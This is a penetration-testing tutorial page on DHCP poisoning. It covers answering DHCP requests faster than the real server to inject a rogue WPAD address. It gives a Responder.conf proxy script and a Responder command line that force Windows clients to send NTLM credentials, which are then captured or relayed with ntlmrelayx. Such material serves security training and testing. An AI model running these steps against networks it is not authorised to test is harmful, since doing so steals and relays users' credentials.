# DHCP poisoning

## Theory

When a workstation reboots or plugs into a network, a broadcast DHCP request is emitted. It's goal is to ask for network settings like an IPv4 address.

> Windows uses several custom DHCP options such as NetBIOS, WINS, WPAD settings. When a workstation sends a DHCP request to get its networking settings, these additional settings can be included in the DHCP answer to facilitate straightforward connectivity and name resolution. _\(_[_Laurent Gaffié_](https://g-laurent.blogspot.com/2021/08/responders-dhcp-poisoner.html)_\)_

[DHCP's option 252](https://docs.microsoft.com/en-us/previous-versions/tn-archive/bb794881%28v=technet.10%29) provides Windows machines with a WPAD configuration. An attacker able to answer broadcast DHCP queries faster than the legit DHCP server can inject any network setting on the requesting client.

## Practice

[Responder](https://github.com/SpiderLabs/Responder) \(Python\) \(from v3.0.7.0\) can be used to operate DHCP poisoning in the following manner

* race against the legit DHCP server to answer `DHCP REQUEST` messages
* sent a DHCP ACK response with a rogue WPAD server address in `option 252` in the network parameters, with a short lease \(10 seconds\)
* wait the lease to expire so that the poisoned client asks for a new lease
* let the client obtain a legitimate lease from the real DHCP server, allowing the client to obtain the right network settings and have connectivity
* the injected WPAD server address will stay until the client reboots \(that's how Windows works 🤷♂ \)
* with the injected WPAD server address, the Windows client will try to obtain the wpad.dat file on the rogue WPAD. Responder will then require the client to authenticate.

In order to start DHCP poisoning for WPAD spoofing with Responder, the `Responder.conf` file needs to be tweaked.

```yaml
WPADScript = function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY ProxySrv:3128; PROXY ProxySrv:3141; DIRECT';}
```

The `ProxySrv` variable \(in red in the following screenshot\) needs to be replace by the rogue WPAD server \(i.e. Responder IP address\).

![](../../../.gitbook/assets/responder_conf_dhcp_poisoning.png)

The attack can then be started with the `-d/--DHCP` argument.

The `--wredir` and `--ProxyAuth` need to be added to force the Windows client to authenticate once the `wpad.dat` is accessed in order to capture hashes.

```bash
responder --interface "eth0" --wredir --ProxyAuth --NBTNSdomain --verbose
```

The proxy auth NTLM authentication can either be [captured](../ntlm/capture.md) with Responder with the command line above or [relayed](../ntlm/relay.md) with [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) \(by using the `--http-port 3128` argument. The `--wredir` and `--ProxyAuth` arguments need to be removed from Responder's command line.\).

## Resources

{% embed url="https://g-laurent.blogspot.com/2021/08/responders-dhcp-poisoner.html" %}



